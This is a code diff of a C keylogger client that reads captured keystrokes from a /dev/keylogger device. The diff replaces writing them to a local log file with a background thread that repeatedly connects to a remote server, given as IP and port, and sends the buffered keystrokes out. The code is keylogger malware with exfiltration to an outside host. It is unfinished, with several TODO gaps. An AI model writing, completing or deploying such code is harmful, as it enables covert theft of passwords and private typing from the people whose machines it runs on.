@@ -3,159 +3,128 @@
 #include <pthread.h>
 #include <unistd.h>
 #include <fcntl.h>
-#include <sys/select.h>
-#include <sys/file.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #include <string.h>
+#include "server_communication.h"
 
-#ifndef FALLOC_FL_COLLAPSE_RANGE
-#define FALLOC_FL_COLLAPSE_RANGE 0x08
-#endif
+#define SMALL_BUFFER_SIZE 32
+#define BIG_BUFFER_SIZE 128
 
-#define BUFFER_SIZE 128
+int isRunning = 1;
+int machineId = -1;
+unsigned int interval = 3;
+unsigned int bigInterval = 30;
+char toSendBuffer[BIG_BUFFER_SIZE];
+int toSendBufferSize = 0;
+pthread_mutex_t toSendBufferMutex = PTHREAD_MUTEX_INITIALIZER;
 
-struct address
-{
-    char *host;
-    int port;
-};
+struct sockaddr_in addr;
+int connectionfd = -1;
+pthread_t connectionThread;
 
-pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
+void* connectionThreadWorker(void* nothing) {
+    connectionfd = socket(AF_INET, SOCK_STREAM, 0);
+    while (isRunning) {
+        // wait, until big buffer empty TODO
 
-int connect(char *host, int port)
-{
-    /* try to connect to server, if ok return 0 else -1*/
-    return -1;
-}
 
-void * sendToServer(void *args)
-{
-    struct address *addr = (struct address *) args;
-    int connected = 1;
-    unsigned char buffer[BUFFER_SIZE];
 
-    printf("Thread starts\n");
-    while(1)
-    {
-        sleep(10);
 
-        if (connected)
-        {
-            /* we are connected to server send log file */
-            FILE *file;
-            if ((file = fopen("/var/log/keylogger.log", "r")) == NULL)
-            {
-                /* log file doesn't exist */
-                continue;
+
+        while(isRunning) {
+            // try to connect
+            while (connect(connectionfd, (const struct sockaddr *) &addr, sizeof(addr)) == -1) {
+                fprintf(stderr, "Can't connect, retrying in %u seconds...\n", interval);
+                sleep(interval);
             }
+            // lock bigbuffer
+            int status = 0;    // 0 -> not ok, 1 -> ok
+            pthread_mutex_lock(&toSendBufferMutex);
+            // send data TODO
+            status = sendDataToServer(connectionfd, toSendBuffer, toSendBufferSize, (uint32_t *) &machineId);
+            // unlock bigbuffer
+            pthread_mutex_unlock(&toSendBufferMutex);
+            close(connectionfd);
+            // if successfully:
+            if (status) {
+                //   notify that bigbuffer have enough space for one small buffer TODO
 
-            flockfile(file);
 
-            fseek(file, 0, SEEK_END);
-            if (ftell(file) < BUFFER_SIZE)
-            {
-                /* log file is not big enough */
-                fclose(file);
-                continue;
+
+
+
+                //   break
+                break;
             }
-            fseek(file, 0, SEEK_SET);
-
-            int readBytes = 0;
-            while (readBytes < BUFFER_SIZE)
-            {
-                readBytes += fread(buffer + readBytes, 1, BUFFER_SIZE - readBytes, file);
-            }
-
-            fclose(file);
-            funlockfile(file);
-
-            /* send buffer to server */
-            printf("Bytes ready to send %d\n", readBytes);
-
-            /* if send succeeded delete block of data in log file */
-            file = fopen("/var/log/keylogger.log", "r");
-            FILE *tmp_file = fopen("/var/log/keylogger.log~", "w");
-            flockfile(file);
-            fseek(file, BUFFER_SIZE, 0);
-            int c;
-            while((c = fgetc(file)) != EOF)
-            {
-                fputc(c, tmp_file);
-            }
-            fclose(tmp_file);
-            fclose(file);
-            unlink("/var/log/keylogger.log");
-            rename("/var/log/keylogger.log~", "/var/log/keylogger.log");
-            funlockfile(file);
-            /* if send does not succeeded leave file as it was and set connected to 0 */
-        }
-        else if (connect(addr->host, addr->port) == 0)
-        {
-            connected = 1;
+            else sleep(bigInterval);
+            // else: wait some time
         }
     }
 }
 
-void logToFile(unsigned char *buffer, int *currentSize)
-{
-    FILE *file  = fopen("/var/log/keylogger.log", "a+");
-    flockfile(file);
-    int writtenBytes = 0;
-    while (*currentSize - writtenBytes > 0)
-    {
-        writtenBytes += fwrite(buffer + writtenBytes, 1, *currentSize - writtenBytes, file);
-    }
-    *currentSize = 0;
-    fclose(file);
-    funlockfile(file);
-}
+char smallBuffer[SMALL_BUFFER_SIZE];
+int smallBufferSize = 0;
 
+int dev_fd = -1;
+int totalRead = 0;
 
 int main(int argc, char *argv[])
 {
-    if (argc != 3)
-    {
+    if (argc != 3) {
         fprintf(stderr, "Incorrect number of arguments\n");
         return 1;
     }
 
-    struct address addr;
-    addr.host = argv[1];
-    addr.port = atoi(argv[2]);
+    // read address and port
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    inet_pton(AF_INET, argv[1], &addr.sin_addr);
+    addr.sin_port = (in_port_t) htons((uint16_t) atoi(argv[2]));
 
-    int dev_fd;
-    if ((dev_fd = open("/dev/keylogger", O_RDONLY)) == -1)
-    {
+    // read computer id TODO
+
+    // open device
+    if ((dev_fd = open("/dev/keylogger", O_RDONLY)) == -1) {
         fprintf(stderr, "Cannot open device\n");
         return 2;
     }
 
-    unsigned char buffer[BUFFER_SIZE];
-    int currentSize = 0;
-
-    pthread_t sender;
-    if (pthread_create(&sender, NULL, &sendToServer, (void *)&addr) != 0)
-    {
+    // create connectionThread
+    if (pthread_create(&connectionThread, NULL, &connectionThreadWorker, NULL) != 0) {
         fprintf(stderr, "Cannot create thread\n");
         return 3;
     }
 
-
-    while (1)
-    {
+    while (1) {
         int readBytes;
-        if ((readBytes = read(dev_fd, buffer + currentSize, BUFFER_SIZE - currentSize)) == -1)
-        {
+        if ((readBytes = read(dev_fd, smallBuffer+smallBufferSize, SMALL_BUFFER_SIZE-smallBufferSize)) == -1) {
             fprintf(stderr, "Error reading device\n");
             close(dev_fd);
             exit(3);
         }
+        totalRead += readBytes;
+        smallBufferSize += readBytes;
+        printf("Read %d bytes, total: %d, current size: %d big: %d\n", readBytes, totalRead, smallBufferSize, toSendBufferSize);
+        if (smallBufferSize == SMALL_BUFFER_SIZE) {
+            // wait until big buffer does not have space for one full small buffer TODO
 
-        currentSize += readBytes;
-        printf("Read %d bytes\n", readBytes);
 
-        if (currentSize == BUFFER_SIZE)
-        {
-            logToFile(buffer, &currentSize);
+
+
+
+            pthread_mutex_lock(&toSendBufferMutex);
+            // copy to big buffer
+            memcpy(toSendBuffer+toSendBufferSize, smallBuffer, SMALL_BUFFER_SIZE);
+            toSendBufferSize += SMALL_BUFFER_SIZE;
+            // notify, that big buffer is not empty TODO
+
+
+
+
+
+            pthread_mutex_unlock(&toSendBufferMutex);
+            smallBufferSize = 0;
         }
     }
 }
